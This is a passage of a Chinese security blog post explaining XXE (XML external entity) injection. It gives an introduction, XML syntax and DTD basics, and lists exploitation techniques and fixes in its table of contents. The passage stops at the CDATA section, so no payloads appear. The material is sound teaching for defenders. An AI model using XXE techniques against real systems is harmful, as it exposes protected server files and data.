<!-- build time:Tue Jan 05 2021 12:19:56 GMT+0800 (GMT+08:00) --><!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>XXE漏洞概述与利用方式和修复方法 | Brilo&#39;s blogs</title><meta name="description" content="XXE是什么?简介:XXE_ (XML EXternal Entity) 即XML 外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载,导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据产生原因:在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。XML解析器解析外部实体时支持多种协议，如:使用file协议可以读取本"><meta property="og:type" content="article"><meta property="og:title" content="XXE漏洞概述与利用方式和修复方法"><meta property="og:url" content="https://bri10.com/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/index.html"><meta property="og:site_name" content="Brilo&#39;s blogs"><meta property="og:description" content="XXE是什么?简介:XXE_ (XML EXternal Entity) 即XML 外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载,导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据产生原因:在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。XML解析器解析外部实体时支持多种协议，如:使用file协议可以读取本"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669206901-cebbf9b9-07ba-4cfd-b496-d0a24c811a13.jpeg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669220464-177174ae-6c55-4beb-b055-6385289deae2.jpeg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/8431122/1609669230257-2e86c24e-2d68-4af1-80de-d8683d37a47c.png"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669237424-4845c5b8-5a94-4ad5-9aae-6aaaa1c5c2b7.jpeg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669246209-c192f113-b8db-4952-b4bd-75f4cb318681.jpeg"><meta property="article:published_time" content="2021-01-05T03:44:15.000Z"><meta property="article:modified_time" content="2021-01-05T04:14:44.513Z"><meta property="article:author" content="Bri10"><meta property="article:tag" content="信息安全"><meta property="article:tag" content="XXE"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669206901-cebbf9b9-07ba-4cfd-b496-d0a24c811a13.jpeg"><link rel="canonical" href="https://bri10.com/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/index.html"><link rel="alternate" href="/atom.xml" title="Brilo&#39;s blogs" type="application/atom+xml"><link rel="icon" href="/Brilo.jpg" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css"><meta name="generator" content="Hexo 4.2.0"></head><body class="main-center theme-green" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="" target="_blank"><img class="img-circle img-rotate" src="/images/Brilo.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Bri10</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">花开万物</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 石家庄, 中国</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">标签</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Brilopro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="http://weibo.cn/Bri10" target="_blank" title="Weibo" data-toggle="tooltip" data-placement="top"><i class="icon icon-weibo"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Sublime-Text3/">Sublime Text3</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a><span class="category-list-count">4</span></li></ul></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/" rel="tag">AWD</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sublime-Text3/" rel="tag">Sublime Text3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">逻辑漏洞</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/AWD/" style="font-size:13.5px">AWD</a> <a href="/tags/CTF/" style="font-size:13.5px">CTF</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/Sublime-Text3/" style="font-size:13px">Sublime Text3</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/php/" style="font-size:13px">php</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size:14px">信息安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size:13px">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:13px">文件包含</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size:13px">逻辑漏洞</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled no-thumbnail"><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></p><p class="item-title"><a href="/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">XXE漏洞概述与利用方式和修复方法</a></p><p class="item-date"><time datetime="2021-01-05T03:44:15.000Z" itemprop="datePublished">2021-01-05</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></p><p class="item-title"><a href="/2021/SSRF%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">SSRF漏洞概述与利用方式和修复方法</a></p><p class="item-date"><time datetime="2021-01-04T07:37:11.000Z" itemprop="datePublished">2021-01-04</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></p><p class="item-title"><a href="/2021/LogicBUG/" class="title">逻辑漏洞详解</a></p><p class="item-date"><time datetime="2021-01-03T10:31:30.000Z" itemprop="datePublished">2021-01-03</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></p><p class="item-title"><a href="/2021/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">反序列化漏洞详解</a></p><p class="item-date"><time datetime="2021-01-03T10:31:30.000Z" itemprop="datePublished">2021-01-03</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></p><p class="item-title"><a href="/2021/Content_security_policy/" class="title">内容安全策略CSP</a></p><p class="item-date"><time datetime="2021-01-02T11:48:29.000Z" itemprop="datePublished">2021-01-02</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE是什么"><span class="toc-number">1.</span> <span class="toc-text">XXE是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML基础"><span class="toc-number">2.</span> <span class="toc-text">XML基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML简介"><span class="toc-number">2.1.</span> <span class="toc-text">XML简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML语法"><span class="toc-number">2.2.</span> <span class="toc-text">XML语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML文档结构"><span class="toc-number">2.3.</span> <span class="toc-text">XML文档结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD"><span class="toc-number">2.4.</span> <span class="toc-text">DTD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PCDATA"><span class="toc-number">2.5.</span> <span class="toc-text">PCDATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CDATA"><span class="toc-number">2.6.</span> <span class="toc-text">CDATA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD实体"><span class="toc-number">2.7.</span> <span class="toc-text">DTD实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参数实体"><span class="toc-number">2.8.</span> <span class="toc-text">参数实体:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用场景"><span class="toc-number">3.</span> <span class="toc-text">利用场景:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞发现"><span class="toc-number">4.</span> <span class="toc-text">漏洞发现:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE漏洞利用"><span class="toc-number">5.</span> <span class="toc-text">XXE漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-有回显的本地文件读取"><span class="toc-number">5.1.</span> <span class="toc-text">1.有回显的本地文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-当所读取文件包含了-lt-或者-amp"><span class="toc-number">5.2.</span> <span class="toc-text">2.当所读取文件包含了&lt;或者&amp;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-使用PHP伪协议进行读取文件"><span class="toc-number">5.3.</span> <span class="toc-text">3.使用PHP伪协议进行读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-无回显的文件读取-OOB-out-of-band外带参数实体注入"><span class="toc-number">5.4.</span> <span class="toc-text">4.无回显的文件读取(OOB out-of-band外带参数实体注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-利用XXE进行端口探测"><span class="toc-number">5.5.</span> <span class="toc-text">5.利用XXE进行端口探测:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-利用php的扩展执行系统命令"><span class="toc-number">5.6.</span> <span class="toc-text">6.利用php的扩展执行系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-利用XXE进行DOS攻击"><span class="toc-number">5.7.</span> <span class="toc-text">7.利用XXE进行DOS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-java中导入execel处存在的XXE"><span class="toc-number">5.8.</span> <span class="toc-text">8.java中导入execel处存在的XXE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞修复"><span class="toc-number">6.</span> <span class="toc-text">漏洞修复:</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-XXE漏洞详解" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">XXE漏洞概述与利用方式和修复方法</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="article-date"><time datetime="2021-01-05T03:44:15.000Z" itemprop="datePublished">2021-01-05</time></a></span> <span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>►<a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></span> <span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link" href="/tags/XXE/" rel="tag">XXE</a>, <a class="article-tag-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></span> <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么?"></a>XXE是什么?</h1><p>简介:XXE_ (XML EXternal Entity) 即XML 外部实体注入攻击，是一种常见的Web安全漏洞，发生在应用程序解析XML输入时，没有禁止外部实体的加载,导致攻击者可以通过XML的外部实体获取服务器中本应被保护的数据<br>产生原因:在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。XML解析器解析外部实体时支持多种协议，如:使用file协议可以读取本地文件内容;使用http协议可以获取web资源等因此攻击者可以构造恶意的外部实体，当解析器解析了包含恶意外部实体的XML类型文件时，便会导致XXE攻击。</p><h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>XML是一种用于标记电子文件使其具有结构性的可扩展标记语言(EXtensible Markup Language).<br>XML是一种非常灵活的语言,类似于HTML语言,但是并没有固定的标签,所有的标签都可以自定义,其设计的宗旨是传输数据,而不是像HTML一样显示数据.<br>XML不会做任何事情,他是被设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他语言或者程序来解析，才能发挥作用。</p><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--自定义根元素girl;age属性需要加引号--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--自定义的4个子元素,即girl对象的属性--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">face</span>&gt;</span>漂亮的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的<span class="tag">&lt;/<span class="name">summary</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>  <span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure><p>1.XML文档必须有一个跟元素<br>2.XML元素都必须有一个关闭标签<br>3.XML标签区分大小写<br>4.XML元素必须被正确的嵌套<br>5.XML属性值必须加引号</p><h2 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h2><p>XML文档结构包括XML声明、DTO文档类型定义(可选)、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--XML 声明--&gt;</span> <span class="comment">&lt;!-- DTD(文档类型定义)--&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">girl</span>[  </span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">girl</span>  (<span class="meta-keyword">hair</span>,<span class="meta-keyword">eye</span>,<span class="meta-keyword">face</span>,<span class="meta-keyword">summary</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">hair</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">eye</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta"> 	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">face</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">summary</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span> </span><br><span class="line">  <span class="comment">&lt;!--自定义根元素girl;age属性需要加引号--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span>  </span><br><span class="line">  <span class="comment">&lt;!--自定义的4个子元素,即girl对象的属性--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">face</span>&gt;</span>漂亮的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的<span class="tag">&lt;/<span class="name">summary</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>  <span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>简介:DTD(Document Type Definition)即文档类型定义,用来为XML文档定义语句约束<br>解释:(1)我们可以吧DTD理解为一个模板,这个模板里面定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性.<br>(2)而”文档元素”则必须为我么你的DTD为模板,来对XML元素的内容进行规范化.</p><p>声明<br>内部声明:DTDT被包含在XML源文件中,应当使用下面的语法包装在一个DOCTYPE声明中:<br>语法:<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>外部声明:加入DTD位于源文件的外部,应当使用下面的语法封装在一个DOCTYPE定义中:<br>语法:<code>&lt;!DOCTYPE 根元素 SYSYTEM &quot;文件名&quot;&gt;</code><br>例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//xml.xml</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- DTD(文档类型定义)--&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"note.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span> </span><br><span class="line">  <span class="comment">&lt;!--自定义根元素girl;age属性需要加引号--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span>  </span><br><span class="line">  <span class="comment">&lt;!--自定义的4个子元素,即girl对象的属性--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">face</span>&gt;</span>漂亮的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的<span class="tag">&lt;/<span class="name">summary</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>  <span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//note.dtd   </span><br><span class="line">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">girl</span>  (<span class="meta-keyword">hair</span>,<span class="meta-keyword">eye</span>,<span class="meta-keyword">face</span>,<span class="meta-keyword">summary</span>)&gt;</span></span><br><span class="line">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">hair</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span><br><span class="line">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">eye</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span><br><span class="line">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">face</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span> </span><br><span class="line">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">summary</span>  (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h2><p>简介:<br>PCDATA值得是被解析的字符数据(Parsed Character Data).<br>XML解析器通常会解析XML文档中所有的文本.<br>在XML中有五个预定义实体引用:</p><table><thead><tr><th align="center">&lt;</th><th align="center">&lt;</th><th align="center">小于</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&amp;</td><td align="center">&amp;</td><td align="center">和号</td></tr><tr><td align="center">&apos;</td><td align="center">‘</td><td align="center">省略号</td></tr><tr><td align="center">&quot;</td><td align="center">“</td><td align="center">引号</td></tr></tbody></table><p>严格的讲,在XML中仅有字符”&lt;”和”&amp;”是非法的.<br>“&lt;”会禅城错误,因为解析器会把该字符解释为新元素的开始.<br>“&amp;”也会产生错误,,因为解析器会把该字符解释为字符实体的开始.<br>省略号、引号和大于号是合法的，但是把他们替换为实体引用是个好的习惯。</p><h2 id="CDATA"><a href="#CDATA" class="headerlink" 